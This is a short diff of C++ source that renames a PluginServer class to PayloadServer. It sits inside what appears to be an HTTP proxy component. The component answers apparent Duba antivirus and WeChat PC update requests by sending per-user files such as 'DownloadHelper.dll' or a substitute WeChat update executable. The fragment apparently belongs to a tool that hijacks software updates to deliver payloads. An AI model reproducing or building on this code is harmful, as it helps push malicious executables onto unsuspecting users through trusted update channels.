@@ -2,7 +2,7 @@
 #include "../HttpUtils.h"
 #include "../FileOper.h"
 #include "../cipher/CryptoUtils.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 
 
 int gDubaFlag = 0;
@@ -45,7 +45,7 @@ int DuBa::replyDuba(char * dstbuf, int len, int dstbuflimit, LPHTTPPROXYPARAM lp
 			"Content-Length: %u\r\n\r\n";
 
 		string filename = Public::getUserUrl(lphttp->username, "DownloadHelper.dll");
-		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpFormat, 1);
 		return 0;
 	}else if (gDubaFlag == 4)
 	{
@@ -55,7 +55,7 @@ int DuBa::replyDuba(char * dstbuf, int len, int dstbuflimit, LPHTTPPROXYPARAM lp
 			"Content-Length: %u\r\n\r\n";
 
 		string filename = Public::getUserUrl(lphttp->username, WEIXIN_PC_UPDATE_EXE_FILENAME);
-		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpFormat, 1);
 		return 0;
 	}
 
